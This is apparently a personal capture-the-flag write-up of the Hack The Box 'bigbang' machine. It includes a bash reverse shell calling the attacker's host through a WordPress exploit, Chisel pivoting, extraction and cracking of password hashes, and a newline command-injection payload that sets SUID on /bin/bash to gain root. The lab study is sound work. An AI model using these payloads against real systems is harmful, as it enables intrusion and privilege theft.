---
tags:
  - infosec
  - htb
date: 2025-01-26 15:29
publish: false
---

## bigbang - 10.129.203.211

### Service Enumeration

| Server IP Address | Ports Open      |
| ----------------- | --------------- |
| 10.129.203.211    | **TCP**: 22, 80 |

### Initial Access

Note: a lot of work--that I missed--went into developing `exploit.py`. The original version is found [here](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py).

```bash
python exploit.py http://blog.bigbang.htb/wp-admin/admin-ajax.php 'bash -c "bash -i >& /dev/tcp/10.10.14.168/9001 0>&1"'
```

`wp-config.php` shows a database at 172.17.0.1

```php
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wp_password' );

/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
```

Now, set up Chisel.

```bash
# on my machine
chisel server -p 9999 --socks5 --reverse &
# on the container
./chisel client 10.10.14.168:9999 R:socks &
```

Confirm that `/etx/proxychains.conf` is configured correctly.

```bash
tail /etc/proxychains4.conf                       
socks5  127.0.0.1 1080
```

I access the database with `proxychains -q mysql -h 172.17.0.1 -u 'wp_user' -p`. Password is `wp_password`.

```
MySQL [wordpress]> select * from wp_users \G;
*************************** 1. row ***************************
                 ID: 1
         user_login: root
          user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
      user_nicename: root
         user_email: root@bigbang.htb
           user_url: http://blog.bigbang.htb
    user_registered: 2024-05-31 13:06:58
user_activation_key: 
        user_status: 0
       display_name: root
*************************** 2. row ***************************
                 ID: 3
         user_login: shawking
          user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
      user_nicename: shawking
         user_email: shawking@bigbang.htb
           user_url: 
    user_registered: 2024-06-01 10:39:55
user_activation_key: 
        user_status: 0
       display_name: Stephen Hawking
```

Grafana is listening on `172.17.0.2:3000`, a different IP.

```
www-data@bf9a078a3627:/tmp$ ./fscan -h 172.17.0.2/32
./fscan -h 172.17.0.2/32

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
172.17.0.2:3000 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://172.17.0.2:3000    code:302 len:29     title:None 跳转url: http://172.17.0.2:3000/login
[*] WebTitle http://172.17.0.2:3000/login code:200 len:38241  title:Grafana
已完成 1/1
```

`hashcat` cracks the hash. `quantumphysics` is the password for `shawking`.

`proxychains ssh shawking@172.17.0.1` with password `quantumphysics` and get the user flag.

### Privilege Escalation

In `/opt/data`, there's a `grafana.db`. The `user` table has credential info:

![](Pasted%20image%2020250126174501.png)

```
sqlite> select * from user;
1|0|admin|admin@localhost||441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf|CgJll8Bmss||1|1|0||2024-06-05 16:14:51|2024-06-05 16:16:02|0|2024-06-05 16:16:02|0|0|
2|0|developer|ghubble@bigbang.htb|George Hubble|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960|4umebBJucv|0Whk1JNfa3||1|0|0||2024-06-05 16:17:32|2025-01-20 16:27:39|0|2025-01-20 16:27:19|0|0|ednvnl5nqhse8d
```

These hashes can be converted with [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat). `grafana2hashcat.py` needs the hash and the salt, separated by a comma, in a text file.

```bash
hashcat -m 10900 ghubble.hash /usr/share/wordlists/rockyou.txt --force

sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang
```

The credentials are `developer:bigbang` because George Hubble's username is `developer`. `ssh developer@"$RHOST"` returns a shell. There's loot in `android/satellite-app.apk`.

`ss -tulpn` shows a listener on `127.0.0.1:9090`.

```bash
ssh -L 9090:127.0.0.1:9090 developer@"$RHOST"

# Then
curl -X POST http://localhost:9090/command
# -> {"msg":"Missing Authorization Header"}

# Get an access token
curl -X POST http://localhost:9090/login -H "Content-Type: application/json" --data '{"username":"developer", "password":"bigbang"}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28"}

# Get a weird error message
curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28" --data '{"command":"move"}'
# -> {"error":"Invalid coordinates. Please provide numeric values for x, y, and z."}

# I moved something???
curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28" --data '{"command":"move", "x":"3", "y":"4", "z":"5"}'
# -> {"status":"developer is moving to coordinates (3.0, 4.0, 5.0)"}

# Fail to generate an image
curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28" --data '{"command":"send_image", "output_file": "/tmp/"}'

curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28" --data '{"command":"send_image", "output_file": "aaa \n /bin/sh -c whoami"}'
# -> {"error":"Error generating image: "}
```

Back on the box, I discover this:

```bash
ls /usr/local/bin
f2py  flask  image-tool  image-tool.c
```

The source code is key to unlocking the privilege escalation.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

#define MAX_PATH_LEN 256

void print_usage() {
    printf("Usage: /usr/local/bin/image-tool [--get-image <image_name.png>]\n");
}

int main(int argc, char *argv[]) {
    // Check if the argument is provided
    if (argc != 3 || strcmp(argv[1], "--get-image") != 0) {
        print_usage();
        return 1;
    }

    // Open directory
    DIR *dir;
    struct dirent *entry;
    char img_dir[MAX_PATH_LEN] = "/root/satellite/img";
    dir = opendir(img_dir);
    if (dir == NULL) {
        perror("Error opening directory");
        return 1;
    }

    // Count the number of PNG files in the directory
    int png_count = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".png") != NULL) {
            png_count++;
        }
    }

    if (png_count == 0) {
        printf("No PNG files found in %s\n", img_dir);
        closedir(dir);
        return 1;
    }

    // Get the specified image name
    char *image_name = argv[2];

    // Check if the specified image exists
    int image_found = 0;
    rewinddir(dir);
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strcmp(entry->d_name, image_name) == 0) {
            image_found = 1;
            break;
        }
    }

    if (!image_found) {
        printf("Specified image '%s' not found in %s\n", image_name, img_dir);
        closedir(dir);
        return 1;
    }

    // Reset directory position
    rewinddir(dir);

    // Copy the specified image to the current directory
    char src_path[MAX_PATH_LEN];
    char dest_path[MAX_PATH_LEN];
    snprintf(src_path, sizeof(src_path), "%s/%s", img_dir, image_name);
    snprintf(dest_path, sizeof(dest_path), "./%s", image_name);

    // Perform the copy operation
    if (link(src_path, dest_path) != 0) {
        perror("Error copying file");
        closedir(dir);
        return 1;
    }

    printf("Copied %s to %s\n", src_path, dest_path);

    closedir(dir);
    return 0;
}
```

This allows for the execution of commands as `root`, but acquiring a reverse shell could be difficult. So, since I already have SSH access, it's fastest to change permissions on `/bin/bash` with a payload like `aaa \n chmod 4777 /bin/bash"}`.

```bash
# Set the SUID bit for /bin/bash
curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDEyNSwianRpIjoiYzBmOTA1MjEtZjdkYy00MjMyLWE0NDMtMWM5ZWM2OGM2NWFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkzNDEyNSwiY3NyZiI6IjcyNGZkMGJmLWZhNjctNDQ4YS04ZjIyLWYxOWI3MjhkMmIxZCIsImV4cCI6MTczNzkzNzcyNX0.rlv1DgTaw7Vz097tSlm9l9N0SLbDTfAfcQlzjOVZb28" --data '{"command":"send_image", "output_file": "aaa \n chmod 4777 /bin/bash"}'
```

Back in `developer`'s SSH session, I escalate to `root`.

```bash
# Don't drop privileges
/bin/bash -p
# I have root
whoami
# -> root
```

